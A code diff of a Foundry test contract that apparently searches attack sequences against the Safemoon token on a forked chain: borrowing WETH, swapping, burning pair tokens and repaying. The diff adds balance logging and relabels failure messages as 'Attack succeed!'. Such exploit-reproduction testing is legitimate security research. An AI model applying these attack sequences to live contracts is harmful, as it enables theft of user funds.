@@ -261,7 +261,9 @@ contract SafemoonTest is Test, BlockLoader {
         emit log_string("");
     }
 
-    function attackGoal() public view returns (bool) {
+    function attackGoal() public returns (bool) {
+        emit log_named_uint("StartBalance", balanceOfwethattacker);
+        emit log_named_uint("FinalBalance", weth.balanceOf(attacker));
         return weth.balanceOf(attacker) >= 1e6 + balanceOfwethattacker;
     }
 
@@ -348,7 +350,7 @@ contract SafemoonTest is Test, BlockLoader {
         swap_pair_attacker_weth_safemoon(amt1, amt2);
         swap_pair_attacker_safemoon_weth(amt3, amt4);
         payback_weth_owner(amt5);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -370,7 +372,7 @@ contract SafemoonTest is Test, BlockLoader {
         swap_pair_attacker_weth_safemoon(amt2, amt3);
         swap_pair_attacker_safemoon_weth(amt4, amt5);
         payback_weth_owner(amt6);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -392,7 +394,7 @@ contract SafemoonTest is Test, BlockLoader {
         burn_safemoon_pair(amt3);
         swap_pair_attacker_safemoon_weth(amt4, amt5);
         payback_weth_owner(amt6);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -412,7 +414,7 @@ contract SafemoonTest is Test, BlockLoader {
         swap_pair_attacker_safemoon_weth(amt1, amt2);
         swap_pair_attacker_weth_safemoon(amt3, amt4);
         payback_safemoon_owner(amt5);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -434,7 +436,7 @@ contract SafemoonTest is Test, BlockLoader {
         swap_pair_attacker_safemoon_weth(amt2, amt3);
         swap_pair_attacker_weth_safemoon(amt4, amt5);
         payback_safemoon_owner(amt6);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -456,7 +458,7 @@ contract SafemoonTest is Test, BlockLoader {
         burn_safemoon_pair(amt3);
         swap_pair_attacker_weth_safemoon(amt4, amt5);
         payback_safemoon_owner(amt6);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -482,7 +484,7 @@ contract SafemoonTest is Test, BlockLoader {
         swap_pair_attacker_weth_safemoon(amt5, amt6);
         swap_pair_attacker_safemoon_weth(amt7, amt8);
         payback_weth_owner(amt9);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -510,7 +512,7 @@ contract SafemoonTest is Test, BlockLoader {
         swap_pair_attacker_weth_safemoon(amt6, amt7);
         swap_pair_attacker_safemoon_weth(amt8, amt9);
         payback_weth_owner(amt10);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -538,7 +540,7 @@ contract SafemoonTest is Test, BlockLoader {
         swap_pair_attacker_weth_safemoon(amt6, amt7);
         swap_pair_attacker_safemoon_weth(amt8, amt9);
         payback_weth_owner(amt10);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -566,7 +568,7 @@ contract SafemoonTest is Test, BlockLoader {
         swap_pair_attacker_weth_safemoon(amt6, amt7);
         swap_pair_attacker_safemoon_weth(amt8, amt9);
         payback_weth_owner(amt10);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -594,7 +596,7 @@ contract SafemoonTest is Test, BlockLoader {
         burn_safemoon_pair(amt7);
         swap_pair_attacker_safemoon_weth(amt8, amt9);
         payback_weth_owner(amt10);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -620,7 +622,7 @@ contract SafemoonTest is Test, BlockLoader {
         swap_pair_attacker_safemoon_weth(amt5, amt6);
         swap_pair_attacker_weth_safemoon(amt7, amt8);
         payback_safemoon_owner(amt9);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -648,7 +650,7 @@ contract SafemoonTest is Test, BlockLoader {
         swap_pair_attacker_safemoon_weth(amt6, amt7);
         swap_pair_attacker_weth_safemoon(amt8, amt9);
         payback_safemoon_owner(amt10);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -676,7 +678,7 @@ contract SafemoonTest is Test, BlockLoader {
         swap_pair_attacker_safemoon_weth(amt6, amt7);
         swap_pair_attacker_weth_safemoon(amt8, amt9);
         payback_safemoon_owner(amt10);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -704,7 +706,7 @@ contract SafemoonTest is Test, BlockLoader {
         swap_pair_attacker_safemoon_weth(amt6, amt7);
         swap_pair_attacker_weth_safemoon(amt8, amt9);
         payback_safemoon_owner(amt10);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -732,7 +734,7 @@ contract SafemoonTest is Test, BlockLoader {
         burn_safemoon_pair(amt7);
         swap_pair_attacker_weth_safemoon(amt8, amt9);
         payback_safemoon_owner(amt10);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -785,7 +787,7 @@ contract SafemoonTest is Test, BlockLoader {
         burn_safemoon_pair(amt3);
         swap_pair_attacker_safemoon_weth(amt4, amt5);
         payback_weth_owner(amt6);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
